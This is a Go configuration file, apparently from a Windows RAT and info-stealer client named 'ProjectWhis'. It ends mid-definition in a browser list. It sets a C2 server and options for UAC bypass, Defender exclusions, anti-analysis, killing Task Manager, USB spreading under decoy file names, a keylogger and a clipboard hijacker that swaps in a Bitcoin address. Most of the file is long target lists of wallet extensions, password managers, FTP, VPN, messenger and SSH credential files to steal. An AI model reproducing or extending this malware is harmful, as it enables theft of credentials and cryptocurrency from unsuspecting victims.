//Windows Environment Path Variables (Remove '%' if used in os.Getenv )
//	%AllUsersProfile% - Open the All User's Profile C:\ProgramData
//	%AppData% - Opens AppData folder C:\Users\{username}\AppData\Roaming
//	%CommonProgramFiles% - C:\Program Files\Common Files
//	%CommonProgramFiles(x86)% - C:\Program Files (x86)\Common Files
//	%HomeDrive% - Opens your home drive C:\
//	%LocalAppData% - Opens local AppData folder C:\Users\{username}\AppData\Local
//	%ProgramData% - C:\ProgramData
//	%ProgramFiles% - C:\Program Files or C:\Program Files (x86)
//	%ProgramFiles(x86)% - C:\Program Files (x86)
//	%Public% - C:\Users\Public
//	%SystemDrive% - C:
//	%SystemRoot% - Opens Windows folder C:\Windows
//	%Temp% - Opens temporary file Folder C:\Users\{Username}\AppData\Local\Temp
//	%UserProfile% - Opens your user's profile C:\Users\{username}

package core

import (
	"ProjectWhis/Clients/HTTPS/Linux/core"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
)

//Main Configuration Variables
var (
	C2                      = [...]string{"https://192.168.1.73:8080/"} //C2 URLs
	InsecureSkipVerify bool = true                                      //Turn this on if you have a self-signed SSL cert

	PingTime  int    = 5                                                                              //Time to ping the C2 in Seconds
	Jitter    int    = 1                                                                              //Random time to add to PingTime (+1-X * time.Seconds)
	UserAgent string = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" //Make sure this Matches the C2

	ClientVersion      string = "Alpha .01"                            //Client Version / Name
	EncryptionPassword        = "1234567890"                           //Make sure this Matches the C2
	InstanceKey        string = "7502dc3f-3011-4832-8ed5-ec415b06abf3" //Should Generate new for each build

	//RootKit bool = false
	Install   bool = false //Enables Userkit and Install
	SmartCopy bool = false //Overrides InstallNames, InstallFolderName, InstallUserLocations, & InstallAdminLocations will use InstallNames, Folders and Locatons for fallback if SmarkCopy fails

	InstallNames               = [...]string{"projectwhis"}            //Possible names for the client to install with
	InstallFolderName          = [...]string{"Project Whis"}           //Possible folder names for the client to install with
	InstallUserLocations       = [...]string{os.Getenv("APPDATA")}     //os.Getenv("APPDATA"), os.Getenv("LOCALAPPDATA"), os.Getenv("USERPROFILE")
	InstallAdminLocations      = [...]string{os.Getenv("ProgramData")} //os.Getenv("ProgramFiles"), os.Getenv("ProgramData")
	Campaign              bool = false                                 //Do not run in Blacklisted Country's

	AntiForensics         bool = false //Runs Anti-Forensics tests at random times
	AntiForensicsResponse int  = 0     //What to do if AntiForensics detects something
	UACBypass             bool = false //Uses the Smart UAC Bypass system to attempt to get Admin rights on install
	ForcedUACBypass       int  = 3     //0 = No, 1 = EventViewer, 2 = SilentCleanup, 3 = FODHelper, 4 = ComputerDefaults, 5 = CMSTP

	Guardian bool = false //Spawns a script in the background to restart the client if killed

	DefenceSystem     bool = false //Monitors registry keys, File attributes and Tasks
	ACG               bool = false //Arbitrary Code Guard, You will not be able to use the ReflectiveRunPE and some Shellcode loaders
	HideFromDefender  bool = false //Adds exceptions to Defender to protect client
	AntiProcessWindow bool = false // If Window is detected hides it
	AntiProcess       bool = false // If process found will attempt to kill it
	BlockTaskManager  bool = false //Disable the menus of Task Manager
	//Close2BSOD      bool = false //Will cause a BSOD if the clients killed

	ClipperState bool   = false                                //Run on Startup Automatically
	BTC          string = "1AEbR1utjaYu3SGtBKZCLJMRR5RS7Bp7eE" //Your Bitcoin Address
	XMR          string = ""                                   //Your Monero Address
	ETH          string = ""                                   //Your Ethereum Address
	Custom       string = ""                                   //Your Crypto Address
	CustomRegex  string = ""                                   //The Regex Pattern to detect

	KeyloggerState bool = false //Run on Startup Automatically
	StealPasswords bool = false //Run on Startup Automatically

	SpreadFileNames = [...]string{"USBDriver", "Installer", "Setup", "Photoshop", "Pictures", "Passwords"} //Names of files to spread with

	BlacklistProcessNames  = [...]string{"Taskmgr.exe", "msconfig.exe", "regedit.exe"}                                                                                                                                                                                                                         //Programs to attempt to kill
	BlacklistWindowsNames  = [...]string{"Task Manager", "System Configuration", "Registry Editor"}                                                                                                                                                                                                            //Programs to attempt to hide from host
	BlacklistCountries     = [...]string{"Singapore"}                                                                                                                                                                                                                                                          //Country you DO NOT want the Client to run in
	BlacklistOrganizations = [...]string{"FireEye"}                                                                                                                                                                                                                                                            //Organizations (Based on IP) that you DO NOT want the Client to run in
	BlacklistMacs          = []string{"00:0c:29", "00:50:56", "08:00:27", "52:54:00 ", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28", "00:01:5D", "00:21:F6", "00:A0:A4", "00:07:82", "00:03:BA", "08:00:20", "2C:C2:60", "00:10:4F", "00:0F:4B", "00:13:97", "00:20:F2", "00:14:4F"} //Mac Addresses you DO NOT want the Client to run in
)

//Advanced Configs
var (
	MaxLogSize int = 5 //Max size of Keystroke log before upload, In MB
	//ImageSuffix      = [...]string{"jpg", "jpeg", "jpe", "jfif", "png", "gif", "bmp", "dib", "tif", "tiff", "heic", "hif", "psd", "svg"}
	//VideoSuffix      = [...]string{"mp4", "avi", "mpeg", "mov", "flv", "webm"}
	//DocumentsSuffix  = [...]string{"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json"}
	//SourceCodeSuffix = [...]string{"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino", "vb"}
	//DataBaseSuffix   = [...]string{"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini"}

	//CommonFolders = [...]string{os.Getenv("USERPROFILE") + "//Pictures//", os.Getenv("USERPROFILE") + "//Downloads//", os.Getenv("USERPROFILE") + "//Documents//"} //Common folders to search for stuff

	HostileProcesses = [...]string{"processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain"} // If detected to not run client Debuggers, Sandbox, VMs, etc

	DriveNames = [...]string{"A", "B", "D", "E", "F", "G", "H", "I", "J", "X", "Y", "Z"} //Drive Letters to Spread too, USB mainly.

	SmartCopyNames = [...]string{"Chrome", "Firefox", "Safari", "Opera", "Brave", "Edge", "Vivaldi", "Maxthon", "Facebook", "Chromium"}

	CryptoRegex = map[string]string{
		"btc":    "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$",
		"xmr":    "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
		"eth":    "^0x[a-fA-F0-9]{40}$",
		"custom": CustomRegex,
	}

	A = []string{"Macintosh", "Windows", "X11"}
	B = []string{"68K", "PPC", "Intel Mac OS X"}
	C = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	D = []string{"Linux i686", "Linux x86_64"}
	E = []string{"chrome", "spider", "ie"}
	F = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}

	Spiders = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}

	Referrers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}

	Discords = map[string]string{
		"Discord":             os.Getenv("APPDATA") + "\\Discord",
		"Discord Canary":      os.Getenv("APPDATA") + "\\discordcanary",
		"Discord PTB":         os.Getenv("APPDATA") + "\\discordptb",
		"Discord Development": os.Getenv("APPDATA") + "\\discorddevelopment",
		"Lightcord":           os.Getenv("APPDATA") + "\\Lightcord",
	}

	PluginsToSteal = map[string]struct {
		Path string
	}{
		"Guild Wallet": {
			Path: "nanjmdknhkinifnkgdcggcfnhdaammmj",
		},
		"Ronin Wallet": {
			Path: "fnjhmkhhmkbjkkabndcnnogagogbneec",
		},
		"Binance Wallet": {
			Path: "fhbohimaelbohpjbbldcngcnapndodjp",
		},
		"KardiaChain": {
			Path: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
		},
		"MetaMask": {
			Path: "nkbihfbeogaeaoehlefnkodbefgpgknn",
		},
		"Wombat": {
			Path: "amkmjjmmflddogmhpjloimipbofnfjih",
		},
		"Jaxx Liberty": {
			Path: "cjelfplplebdjjenllpjcblmjkfcffne",
		},
		"Oxygen": {
			Path: "fhilaheimglignddkjgofkcbgekhenbh",
		},
		"TronLink": {
			Path: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
		},
		"Terra Station": {
			Path: "aiifbnbfobpmeekipheeijimdpnlpgpp",
		},
		"Harmony": {
			Path: "fnnegphlobjdpkhecapkijjdkgcjhkib",
		},
		"MEW CX": {
			Path: "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
		},
		"TON Crystal Wallet": {
			Path: "cgeeodpfagjceefieflmdfphplkenlfk",
		},
		"Math Wallet": {
			Path: "afbcbjpbpfadlkmhmclhkeeodmamcflc",
		},
		"Guarda": {
			Path: "hpglfhgfnhbgpjdenjgmdgoeiappafln",
		},
		"Yoroi": {
			Path: "ffnbelfdoeiohenkjibnmadjiehjhajb",
		},
		"BitApp Wallet": {
			Path: "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		},
		"iWallet": {
			Path: "kncchdigobghenbbaddojjnnaogfppfj",
		},
		"Nifty Wallet": {
			Path: "jbdaocneiiinmjbjlgalhcelgbejmnid",
		},
		"Saturn Wallet": {
			Path: "nkddgncdjgjfcddamfgcmfnlhccnimig",
		},
		"Coin98 Wallet": {
			Path: "aeachknmefphepccionboohckonoeemg",
		},
		"Coinbase Wallet": {
			Path: "hnfanknocfeofbddgcijnmhnfnkdnaad",
		},
		"EQUAL Wallet": {
			Path: "blnieiiffboillknjnepogjhkgnoapac",
		},
	}

	stuffToSteal = map[string]struct {
		Path  string
		Query string
		Item  string
		Reg   bool
	}{
		"Armory": {
			Path:  os.Getenv("APPDATA") + "\\Armory\\",
			Query: "wallet",
		},
		"Bytecoin": {
			Path:  os.Getenv("APPDATA") + "\\Bytecoin\\",
			Query: "wallet",
		},
		"MultiBitHD": {
			Path:  os.Getenv("APPDATA") + "\\MultiBitHD\\",
			Query: "wallet",
		},
		"Electrum": {
			Path: os.Getenv("APPDATA") + "\\Electrum\\wallets\\",
		},
		"Electrum-LTC": {
			Path: os.Getenv("APPDATA") + "\\Electrum-LTC\\wallets\\",
		},
		"ElectronCash": {
			Path: os.Getenv("APPDATA") + "\\ElectronCash\\wallets\\",
		},
		"Electrum-btcp": {
			Path: os.Getenv("APPDATA") + "\\Electrum-btcp\\wallets\\",
		},
		"Ethereum": {
			Path: os.Getenv("APPDATA") + "\\Ethereum\\keystore\\",
		},
		"Exodus": {
			Path:  os.Getenv("APPDATA") + "\\Exodus\\",
			Query: "wallet",
		},
		"Zcash": {
			Path: os.Getenv("APPDATA") + "\\Zcash\\",
		},
		"Jaxx": {
			Path: os.Getenv("APPDATA") + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
		},
		"AtomicWallet": {
			Path: os.Getenv("APPDATA") + "\\atomic\\Local Storage\\leveldb",
		},
		"Guarda": {
			Path: os.Getenv("APPDATA") + "\\Guarda\\Local Storage\\leveldb",
		},
		"Coinomi": {
			Path: os.Getenv("LocalAppData") + "\\Coinomi\\Coinomi\\wallets\\",
		},
		"Bitcoin": {
			Path: os.Getenv("APPDATA") + "\\Bitcoin\\",
			Item: "wallet.dat",
		},
		"LBRY": {
			Path: os.Getenv("LocalAppData") + "\\lbry\\lbryum\\wallets\\",
		},
		"Monero": {
			Path: os.Getenv("UserProfile") + "\\Documents\\Monero\\wallets\\",
		},
		"DashCore": {
			Path: os.Getenv("APPDATA") + "\\DashCore\\",
			Item: "wallet.dat",
		},
		"Litecoin": {
			Path: os.Getenv("APPDATA") + "\\Litecoin\\",
			Item: "wallet.dat",
		},
		"Doge": {
			Path: os.Getenv("APPDATA") + "\\DogeCoin\\",
			Item: "wallet.dat",
		},
		"MultiDoge": {
			Path: os.Getenv("APPDATA") + "\\MultiDoge\\",
			Item: "multidoge.wallet",
		},
		"Bither": {
			Path: os.Getenv("APPDATA") + "\\Bither\\",
			Item: "address.db",
		},
		"Wasabi": {
			Path: os.Getenv("APPDATA") + "\\WalletWasabi\\Client\\Wallets\\",
		},
		"XAMPP_SendMail": {
			Path: "C:\\xampp\\sendmail\\",
			Item: "sendmail.ini",
		},
		"XAMPP_phpMyAdmin": {
			Path: "C:\\xampp\\phpMyAdmin\\",
			Item: "config.inc.php",
		},
		"Transmission": {
			Path: os.Getenv("APPDATA") + "\\transmission\\",
			Item: "settings.json",
		},
		"ShareX_H_": {
			Path: os.Getenv("UserProfile") + "\\Documents\\ShareX\\",
			Item: "History.json",
		},
		"ShareX_U_": {
			Path: os.Getenv("UserProfile") + "\\Documents\\ShareX\\",
			Item: "UploadersConfig.json",
		},
		"ExpanDrive": {
			Path: os.Getenv("AppData") + "\\ExpanDrive\\",
			Item: "drives.js",
		},
		"SeaMonkey": {
			Path: os.Getenv("AppData") + "\\Mozilla\\SeaMonkey\\",
			Item: "profiles.ini",
		},
		"Proxifier": {
			Path: os.Getenv("APPDATA") + "\\Proxifier\\Profiles\\",
			Item: "Default.ppx",
		},
		"QupZilla": {
			Path: os.Getenv("LocalAppData") + "\\QupZilla\\profiles\\default\\",
			Item: "browsedata.db",
		},
		"Notepad++": {
			Path: os.Getenv("AppData") + "\\Notepad++\\backup\\",
		},
		"OBS Studio": {
			Path: os.Getenv("AppData") + "\\obs-studio\\basic\\profiles\\",
		},
		"Miranda": {
			Path: os.Getenv("AppData") + "\\Miranda\\",
		},
		"RoboForm": {
			Path: os.Getenv("LocalAppData") + "\\RoboForm\\Profiles\\",
		},
		"Dashlane": {
			Path: os.Getenv("AppData") + "\\Dashlane\\profiles\\",
		},
		"Muon Snowflake": {
			Path: os.Getenv("UserProfile") + "\\snowflake-ssh\\",
			Item: "session-store.json",
		},
		"ngrok2": {
			Path: os.Getenv("UserProfile") + "\\.ngrok2\\",
			Item: "ngrok.yml",
		},
		"Authy Desktop": {
			Path: os.Getenv("AppData") + "\\Authy Desktop\\",
		},
		"GitHub Desktop": {
			Path: os.Getenv("AppData") + "\\GitHub Desktop\\Local Storage\\leveldb\\",
		},
		"Lunascape": {
			Path: os.Getenv("ProgramFiles") + "\\Lunascape\\Lunascape6\\plugins\\{9BDD5314-20A6-4d98-AB30-8325A95771EE}\\",
		},
		"Apache Directory Studio": {
			Path: os.Getenv("UserProfile") + "\\.ApacheDirectoryStudio\\.metadata\\.plugins\\org.apache.directory.studio.connection.core\\",
			Item: "connections.xml",
		},
		"PHP Composer": {
			Path: os.Getenv("AppData") + "\\Composer\\",
			Item: "auth.json",
		},
		"PHP Composer2": {
			Path: os.Getenv("COMPOSER_HOME") + "\\",
			Item: "auth.json",
		},
		"Flock": {
			Path: os.Getenv("AppData") + "\\Flock\\Browser\\",
		},
		"WinAuth": {
			Path: os.Getenv("AppData") + "\\WinAuth\\",
			Item: "winauth.xml",
		},
		"Trillian": {
			Path: os.Getenv("AppData") + "\\Trillian\\users\\global\\",
			Item: "accounts.dat",
		},
		"Squirrel": {
			Path: os.Getenv("UserProfile") + "\\.squirrel-sql\\",
			Item: "SQLAliases23.xml",
		},
		"Robomongo": {
			Path: os.Getenv("UserProfile") + "\\.config\\robomongo\\",
			Item: "robomongo.json",
		},
		"3T": {
			Path: os.Getenv("UserProfile") + "\\.3T\\robo-3t\\1.1.1\\",
			Item: "robo3t.json",
		},
		"PostgreSQL": {
			Path: os.Getenv("APPDATA") + "\\postgresql\\",
			Item: "pgpass.conf",
		},
		"TortoiseSVN": {
			Path: os.Getenv("APPDATA") + "\\Subversion\\auth\\",
			Item: "svn.simple",
		},
		"Pale Moon": {
			Path: os.Getenv("APPDATA") + "\\Moonchild Productions\\Pale Moon\\",
			Item: "profiles.ini",
		},
		"NETGATE BlackHawk": {
			Path: os.Getenv("APPDATA") + "\\NETGATE Technologies\\BlackHawk\\",
			Item: "profiles.ini",
		},
		"Icecat": {
			Path: os.Getenv("APPDATA") + "\\Mozilla\\icecat\\",
			Item: "profiles.ini",
		},
		"Cyberfox": {
			Path: os.Getenv("APPDATA") + "\\8pecxstudios\\Cyberfox\\",
			Item: "profiles.ini",
		},
		"CoffeeCup_0": {
			Path: os.Getenv("ProgramFiles") + "\\CoffeeCup Software\\",
			Item: "SharedSettings.ccs",
		},
		"CoffeeCup_1": {
			Path: os.Getenv("AppData") + "\\CoffeeCup Software\\",
			Item: "SharedSettings.ccs",
		},
		"CoffeeCup_2": {
			Path: os.Getenv("LocalAppData") + "\\CoffeeCup Software\\",
			Item: "SharedSettings.sqlite",
		},
		"CoffeeCup_3": {
			Path: os.Getenv("AppData") + "\\CoffeeCup Software\\",
			Item: "SharedSettings_1_0_5.sqlite",
		},
		"JDownloader": {
			Path: os.Getenv("ProgramFiles") + "\\jDownloader\\config\\",
			Item: "database.script",
		},
		"Binance": {
			Path:  os.Getenv("AppData") + "\\Binance\\",
			Query: "json",
		},
		"1Password": {
			Path:  os.Getenv("LocalAppData") + "\\1Password\\data\\",
			Query: "sqlite",
		},
		"NordPass": {
			Path:  os.Getenv("AppData") + "\\NordPass\\",
			Query: "sqlite",
		},
		"GIT": {
			Path:  os.Getenv("UserProfile") + "\\",
			Query: "gitconfig",
		},
		"GIT1": {
			Path:  os.Getenv("UserProfile") + "\\",
			Query: "git-credentials",
		},
		"Maven": {
			Path: os.Getenv("UserProfile") + "\\.m2\\",
			Item: "settings-security.xml",
		},
		"PrivateVPN": {
			Path: os.Getenv("LocalAppData") + "\\Privat_Kommunikation_AB\\",
			Item: "user.config",
		},
		"OpenVPN": {
			Path:  os.Getenv("APPDATA") + "\\OpenVPN Connect\\profiles\\",
			Query: "ovpn",
		},
		"FlashFXP": {
			Path: os.Getenv("APPDATA") + "\\FLASHFXP\\",
			Item: "3QUICK.DAT",
		},
		"FTPInfo_CFG": {
			Path: os.Getenv("APPDATA") + "\\FTPInfo\\",
			Item: "ServerList.cfg",
		},
		"FTPInfo_XML": {
			Path: os.Getenv("APPDATA") + "\\FTPInfo\\",
			Item: "ServerList.xml",
		},
		"ALFTP": {
			Path: os.Getenv("APPDATA") + "\\Estsoft\\ALFTP\\",
			Item: "ESTdb2.dat",
		},
		"MyFTP": {
			Path: os.Getenv("APPDATA") + "\\BlazeFtp\\",
			Item: "site.dat",
		},
		"Staff-FTP": {
			Path: os.Getenv("ProgramFiles") + "\\Staff-FTP\\",
			Item: "sites.ini",
		},
		"GoFTP": {
			Path: os.Getenv("ProgramFiles") + "\\GoFTP\\settings\\",
			Item: "Connections.txt",
		},
		"DeluxeFTP": {
			Path: os.Getenv("ProgramFiles") + "\\DeluxeFTP\\",
			Item: "sites.xml",
		},
		"EasyFTP": {
			Path: os.Getenv("ProgramFiles") + "\\EasyFTP\\data\\",
		},
		"NetSarang": {
			Path: os.Getenv("UserProfile") + "\\Documents\\NetSarang\\Xftp\\Sessions\\",
		},
		"NetSarang1": {
			Path: os.Getenv("APPDATA") + "\\NetSarang\\Xftp\\Sessions\\",
		},
		"NetDrive": {
			Path: os.Getenv("APPDATA") + "\\NetDrive\\",
			Item: "NDSites.ini",
		},
		"BitKinex": {
			Path: os.Getenv("APPDATA") + "\\BitKinex\\",
			Item: "bitkinex.ds",
		},
		"NovaFTP": {
			Path: os.Getenv("LocalAppData") + "\\INSoftware\\NovaFTP\\",
			Item: "NovaFTP.db",
		},
		"32BitFTP": {
			Path: os.Getenv("SystemRoot") + "\\",
			Item: "32BitFtp.ini",
		},
		"NexusFile": {
			Path: os.Getenv("APPDATA") + "\\NexusFile\\userdata\\",
			Item: "ftpsite.ini",
		},
		"NexusFile1": {
			Path: os.Getenv("ProgramFiles") + "\\NexusFile\\userdata\\",
			Item: "ftpsite.ini",
		},
		"SFTP": {
			Path: os.Getenv("APPDATA") + "\\SftpNetDrive\\",
		},
		"FTPNow": {
			Path: os.Getenv("ProgramFiles") + "\\FTP Now\\",
			Item: "sites.xml",
		},
		"FTPNow1": {
			Path: os.Getenv("APPDATA") + "\\FTP Now\\",
			Item: "sites.xml",
		},
		"FTPBox": {
			Path: os.Getenv("APPDATA") + "\\FTPBox\\",
			Item: "profiles.conf",
		},
		"WinFTP": {
			Path: os.Getenv("ProgramFiles") + "\\WinFtp Client\\",
			Item: "Favorites.dat",
		},
		"Far Manager": {
			Path: os.Getenv("APPDATA") + "\\Far Manager\\Profile\\PluginsData\\",
			Item: "42E4AEB1-A230-44F4-B33C-F195BB654931.db",
		},
		"CyberDuck": {
			Path: os.Getenv("AppData") + "\\Cyberduck\\Bookmarks\\",
		},
		"mRemoteNG": {
			Path: os.Getenv("APPDATA") + "\\mRemoteNG\\",
			Item: "confCons.xml",
		},
		"FTPGetter": {
			Path: os.Getenv("APPDATA") + "\\FTPGetter\\",
			Item: "servers.xml",
		},
		"Total Commander": {
			Path: os.Getenv("APPDATA") + "\\GHISLER\\",
			Item: "wcx_ftp.ini",
		},
		"IDM-History": {
			Path: os.Getenv("APPDATA") + "\\IDM\\",
			Item: "UrlHistory.txt",
		},
		"Winbox": {
			Path: os.Getenv("APPDATA") + "\\Mikrotik\\Winbox\\",
			Item: "settings.cfg.viw",
		},
		"FileZilla": {
			Path: os.Getenv("APPDATA") + "\\Filezilla\\",
			Item: "recentservers.xml",
		},
		"FileZilla1": {
			Path: os.Getenv("APPDATA") + "\\Filezilla\\",
			Item: "sitemanager.xml",
		},
		"FileZilla_PEM": {
			Path:  os.Getenv("APPDATA") + "\\Filezilla\\",
			Query: "pem",
		},
		"Teamspeak3": {
			Path:  os.Getenv("APPDATA") + "\\TS3Client\\",
			Query: "db",
		},
		"Telegram": {
			Path: os.Getenv("APPDATA") + "\\Telegram Desktop\\tdata\\",
		},
		"Skype": {
			Path: os.Getenv("APPDATA") + "\\Microsoft\\Skype for Desktop\\Local Storage\\",
		},
		"Slack_Storage": {
			Path: os.Getenv("APPDATA") + "\\Slack\\storage\\",
		},
		"Slack_Cookies": {
			Path: os.Getenv("APPDATA") + "\\Slack\\Cookies\\",
		},
		"Utopia": {
			Path:  os.Getenv("APPDATA") + "\\Utopia\\Utopia Client\\db\\",
			Query: "db",
		},
		"WhatsApp": {
			Path: os.Getenv("APPDATA") + "\\WhatsApp\\Local Storage\\leveldb\\",
		},
		"Signal": {
			Path: os.Getenv("APPDATA") + "\\Signal\\sql\\",
		},
		"Signal_Config": {
			Path: os.Getenv("APPDATA") + "\\Signal\\",
			Item: "config.json",
		},
		"Mailspring": {
			Path: os.Getenv("APPDATA") + "\\Mailspring\\",
			Item: "config.json",
		},
		"TheBat!": {
			Path: os.Getenv("APPDATA") + "\\The Bat!\\",
		},
		"Opera Mail": {
			Path: os.Getenv("APPDATA") + "\\Opera Mail\\Opera Mail\\",
			Item: "wand.dat",
		},
		"PocoMail": {
			Path: os.Getenv("APPDATA") + "\\PocoMail\\",
			Item: "accounts.ini",
		},
		"PocoMail1": {
			Path: os.Getenv("UserProfile") + "\\Documents\\Pocomail\\",
			Item: "accounts.ini",
		},
		"Postbox": {
			Path: os.Getenv("APPDATA") + "\\Postbox\\",
			Item: "profiles.ini",
		},
		"MailBird": {
			Path: os.Getenv("LocalAppData") + "\\Mailbird\\Store\\",
			Item: "Store.db",
		},
		"Thunderbird": {
			Path: os.Getenv("APPDATA") + "\\Thunderbird\\",
			Item: "profiles.ini",
		},
		"Pidgin": {
			Path: os.Getenv("APPDATA") + "\\.purple\\",
			Item: "accounts.xml",
		},
		"Psi": {
			Path: os.Getenv("APPDATA") + "\\Psi\\profiles\\default\\",
		},
		"Psi+": {
			Path: os.Getenv("APPDATA") + "\\Psi+\\profiles\\default\\",
		},
		"Growtopia": {
			Path:  os.Getenv("LocalAppData") + `\\Growtopia\\`,
			Query: "dat",
		},
		"Rogues Tale": {
			Path:  os.Getenv("UserProfile") + `\\Documents\\Rogue's Tale\\users\\`,
			Query: "userdata",
		},
		"RDP": {
			Path:  os.Getenv("UserProfile") + `\\`,
			Query: "rdp",
		},
		"Kalypso Media": {
			Path: os.Getenv("APPDATA") + "\\Kalypso Media\\Launcher\\",
			Item: "launcher.ini",
		},
		"UPlay": {
			Path: os.Getenv("LocalAppData") + "\\Ubisoft Game Launcher\\",
		},
		"SmartFTP": {
			Path: os.Getenv("AppData") + "\\SmartFTP\\",
		},
		"GNU Privacy Guard": {
			Path: os.Getenv("AppData") + "\\gnupg\\",
		},
		"SDRTrunk": {
			Path: os.Getenv("UserProfile") + "\\SDRTrunk\\playlist\\",
		},
		"SlimBrowser": {
			Path: os.Getenv("AppData") + "\\SlimBrowser\\Profiles\\",
		},
		"PostboxApp": {
			Path: os.Getenv("AppData") + "\\PostboxApp\\Profiles\\",
		},
		"Sherrod FTP": {
			Path: os.Getenv("ProgramFiles") + "\\Sherrod Computers\\sherrod FTP\\favorites\\",
		},
		"Minecraft LavaServer": {
			Path: os.Getenv("APPDATA") + "\\.LavaServer\\",
			Item: "Settings.reg",
		},
		"Minecraft VimeWorld": {
			Path: os.Getenv("APPDATA") + "\\.vimeworld\\",
			Item: "config",
		},
		"Minecraft McSkill": {
			Path: os.Getenv("APPDATA") + "\\McSkill\\",
			Item: "settings.bin",
		},
		"Minecraft loliland": {
			Path: os.Getenv("UserProfile") + "\\loliland\\",
			Item: "auth.json",
		},
		"Minecraft": {
			Path: os.Getenv("APPDATA") + "\\.minecraft\\",
			Item: "launcher_profiles.json",
		},
		"Minecraft RedServer": {
			Path: os.Getenv("APPDATA") + "\\.redserver\\authdata\\",
		},
		"Windows Subsystem for Linux": {
			Path: os.Getenv("LocalAppData") + "\\lxss\\rootfs\\etc\\",
			Item: "shadow",
		},
		"qBittorrent": {
			Path: os.Getenv("AppData") + "\\qBittorrent\\",
			Item: "qBittorrent.ini",
		},
		"WinRAR_History": {
			Path: `HKEY_CURRENT_USER\Software\WinRAR\ArcHistory`,
			Reg:  true,
		},
		"Putty": {
			Path: `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY`,
			Reg:  true,
		},
		"PuttyCM": {
			Path: `HKEY_CURRENT_USER\Software\ACS\PuTTY Connection Manager`,
			Reg:  true,
		},
		"Vitalwerks DUC x64": {
			Path: `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC`,
			Reg:  true,
		},
		"Vitalwerks DUC": {
			Path: `HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC`,
			Reg:  true,
		},
		"KiTTY": {
			Path: `HKEY_CURRENT_USER\Software\9bis.com\KiTTY\Sessions`,
			Reg:  true,
		},
		"IntelliForms": {
			Path: `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\IntelliForms\Storage2`,
			Reg:  true,
		},
		"EarthVPN": {
			Path: `HKEY_CURRENT_USER\Software\SimonTatham`,
			Reg:  true,
		},
		"WinSCP": {
			Path: `HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions`,
			Reg:  true,
		},
		"FarFTP": {
			Path: `HKEY_CURRENT_USER\Software\Far\Plugins\FTP\Hosts`,
			Reg:  true,
		},
		"Far2FTP": {
			Path: `HKEY_CURRENT_USER\Software\Far2\Plugins\FTP\Hosts`,
			Reg:  true,
		},
		"ClassicFTP": {
			Path: `HKEY_CURRENT_USER\Software\NCH Software\ClassicFTP\FTPAccounts`,
			Reg:  true,
		},
		"Paltalk": {
			Path: `HKEY_CURRENT_USER\Software\A.V.M.\Paltalk NG\common_settings\\core\\users`,
			Reg:  true,
		},
		"IncrediMail": {
			Path: `HKEY_CURRENT_USER\Software\IncrediMail\Identities`,
			Reg:  true,
		},
		"Google Talk": {
			Path: `HKEY_CURRENT_USER\Software\Google\Google Talk\Accounts`,
			Reg:  true,
		},
		"Pixel Worlds": {
			Path: `HKEY_CURRENT_USER\SOFTWARE\Kukouri\Pixel Worlds`,
			Reg:  true,
		},
		"ClickWars2": {
			Path: `HKEY_CURRENT_USER\SOFTWARE\ClickWar2`,
			Reg:  true,
		},
		"PlagueCheats": {
			Path: `HKEY_CURRENT_USER\SOFTWARE\zzplaguecheat`,
			Reg:  true,
		},
		"AutoLogon": {
			Path: `HKEY_LOCAL_MACHINE\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
			Reg:  true,
		},
		"DownloadManagerIDM": {
			Path: `HKEY_CURRENT_USER\Software\DownloadManager`,
			Reg:  true,
		},
	}

	browserList = map[string]struct {
		ProfilePath string
		Name        string
		KeyPath     string
		Storage     string
		New         func(profile, key, name, storage string) Browser
	}{
		"firefox": {
			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
			Name:        firefoxName,
			New:         NewFirefox,
		},
		"firefox-beta": {
			ProfilePath: os.Getenv("USERPROFILE") + fireFoxBetaProfilePath,
			Name:        firefoxBetaName,
			New:         NewFirefox,
		},
		"firefox-dev": {
			ProfilePath: os.Getenv("USERPROFILE") + fireFoxDevProfilePath,
			Name:        firefoxDevName,
			New:         NewFirefox,
		},
